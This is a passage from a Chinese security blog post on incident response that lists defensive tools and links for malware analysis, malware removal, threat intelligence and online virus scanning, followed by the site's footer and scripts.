+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>工具篇
+######## 病毒分析
+PCHunter：http://www.xuetr.com
+火绒剑：https://www.huorong.cn
+Process Explorer：https://docs.microsoft.com/zhcn/sysinternals/downloads/process-explorer
+processhacker：https://processhacker.sourceforge.io/downloads.php
+######## 病毒查杀
+卡巴斯基：http://devbuilds.kasperskylabs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新
+病毒库）
+大蜘蛛：http://free.drweb.ru/download+cureit+free
+######## 病毒动态
+CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn
+微步在线威胁情报社区：https://x.threatbook.cn
+火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html
+爱毒霸社区：http://bbs.duba.net
+腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html
+######## 在线病毒扫描网站
+Virustotal：https://www.virustotal.com
+Virscan：http://www.virscan.org
+腾讯哈勃分析系统：https://habo.qq.com
+Jotti 恶意软件扫描系统：https://virusscan.jotti.org</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-tag" title="Tags - 应急响应">应急响应</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E9%98%B2%E5%AE%88/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/40/" class="post-nav-item" rel="prev" title="应急响应-Webshell流量特征"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>应急响应-Webshell流量特征</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/55/" class="post-nav-item" rel="next" title="域环境搭建">域环境搭建<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
